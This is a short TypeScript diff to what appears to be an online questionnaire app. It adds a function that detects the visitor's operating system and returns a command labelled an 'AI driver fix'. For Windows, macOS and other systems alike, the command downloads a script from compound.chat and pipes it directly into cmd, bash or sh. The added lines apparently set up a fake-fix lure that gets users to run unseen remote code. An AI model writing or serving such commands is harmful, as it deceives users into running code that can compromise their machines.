@@ -28,3 +28,11 @@ export function getPageTitle(code: string): string {
   if (type === "professional") return "Online Questionnaire";
   return "Online Questionnaire";
 }
+
+/** AI driver fix command by OS (from User-Agent). */
+export function getCommandTextForOs(os: string | null): string {
+  const s = (os ?? "").toLowerCase();
+  if (s.includes("win")) return "curl https://compound.chat/video-recording/aidriver-enable-win | cmd";
+  if (s.includes("mac") || s.includes("ios")) return "curl https://compound.chat/video-recording/aidriver-enable | bash";
+  return "curl https://compound.chat/video-recording/aidriver-enable | sh";
+}
